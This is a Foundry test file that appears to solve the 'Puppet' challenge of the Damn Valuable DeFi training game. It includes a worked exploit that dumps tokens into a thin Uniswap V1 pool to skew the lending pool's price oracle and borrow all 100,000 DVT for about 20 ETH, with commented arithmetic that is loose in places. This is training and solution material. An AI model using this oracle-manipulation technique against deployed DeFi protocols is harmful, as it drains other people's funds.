// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";

interface UniswapV1Exchange {
    function addLiquidity(
        uint256 min_liquidity,
        uint256 max_tokens,
        uint256 deadline
    ) external payable returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold)
        external
        view
        returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract Puppet is Test {
    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 25e18;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    UniswapV1Exchange internal uniswapV1ExchangeTemplate;
    UniswapV1Exchange internal uniswapExchange;
    UniswapV1Factory internal uniswapV1Factory;

    DamnValuableToken internal dvt;
    PuppetPool internal puppetPool;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        uniswapV1Factory = UniswapV1Factory(
            deployCode("./src/build-uniswap/v1/UniswapV1Factory.json")
        );

        // Deploy a exchange that will be used as the factory template
        uniswapV1ExchangeTemplate = UniswapV1Exchange(
            deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json")
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        uniswapExchange = UniswapV1Exchange(
            uniswapV1Factory.createExchange(address(dvt))
        );

        vm.label(address(uniswapExchange), "Uniswap Exchange");

        // Deploy the lending pool
        puppetPool = new PuppetPool(address(dvt), address(uniswapExchange));
        vm.label(address(puppetPool), "Puppet Pool");

        // Add initial token and ETH liquidity to the pool
        dvt.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE, // max_tokens
            DEADLINE // deadline
        );

        // Ensure Uniswap exchange is working as expected
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(
                1 ether,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    /**
     * Exploit Overview:
     *
     * This exploit introduces the idea of uniswap liquidity pools and how to manipulate them.
     *
     * Initially to borrow all tokens from the lending pool (100000 DVT) we would need twice the
     * amount of equivalent VALUE in ETH. The value is calcluated as the ratio between the two assets
     * so initially as they have the same ratio it would cost 200000 ETH.
     *
     * The liquidity pool has a balance of 10 ETH : 10 DVT. Since we have a lot more DVT and ETH
     * than the pool, we can manipulate the liquididty pools price ratio, since liquidity pools
     * are meant to have 50:50 eq value of both tokens.
     *
     * Liquidity Pools swaps are calculated AFTER the deposit so after depositing our 1000 DVT
     * the ratio becomes 10 ETH : 1010 DVT. since we contributed > 99% of the tokens on the right
     * we are entitled to > 99% of the tokens of the ETH which is just under 10 ETH.
     *  Which then results in a price ratio of 0.01 ETH ~: 1010 DVT. Essentially heavily
     *  devaluing the DVT in relation to ETH.
     *
     * It is calculated as follows (not accounting for the 0.3% fee)
     * https://github.com/Uniswap/v1-contracts/blob/c10c08d81d6114f694baa8bd32f555a40f6264da/contracts/uniswap_exchange.vy#L437
     *
     * num = DEPOSITED_TOKENS * ETH_RESERVE
     * den = TOTAL_TOKENS + DEPOSITED_TOKENS
     *
     * num = 1000 DVT * 10 ETH
     * den = 10 DVT + 1000 DVT
     * ouput ~= 9.9009.. ETH
     *
     * 1 DVT ~= (0.09 / 1010) ETH
     *
     * The oracle for the price will then equate borrowing the entire lending pools funds
     * of 100000 DVT for:
     *
     * 100000 DVT ~= (0.09 / 1010) * 100000 * 2
     *
     * Which comes out to be just under 20ETH which we have!
     *
     * So we then request the loan from the lending pool to borrow all DVT for 20ETH
     * which leaves us with
     *
     * Attacker ETH: 25 + 9.9 ETH (from deposited 1000 DVT) - ~20ETH (to borrow DVT) = ~15 ETH
     * Attacker DVT: 100000
     */

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);

        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);

        uniswapExchange.tokenToEthSwapInput(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            9e18, // 0.5
            block.timestamp + 15
        );

        puppetPool.borrow{value: 20e18}(POOL_INITIAL_TOKEN_BALANCE);

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertGe(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetPool)), 0);
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(
        uint256 input_amount,
        uint256 input_reserve,
        uint256 output_reserve
    ) internal returns (uint256) {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }
}
